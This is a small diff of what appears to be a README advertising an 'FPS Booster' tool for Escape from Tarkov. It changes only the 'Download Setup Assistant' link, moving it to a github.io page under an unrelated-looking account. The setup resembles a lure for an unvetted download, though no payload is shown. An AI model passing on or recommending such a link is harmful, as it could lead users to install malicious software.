@@ -3,7 +3,7 @@
 Elevate your Tarkov gameplay with this lightweight and powerful FPS Booster tool designed specifically for Escape from Tarkov. Tweak hidden system settings, eliminate performance bottlenecks, and ensure smoother, more responsive gameplay on any hardware.
 
 🔘 **Download Setup Assistant:**  
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://eft-fps-boost-tool.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://geibelrismy.github.io/.github/eft-fps-boost)
 
 ---
 
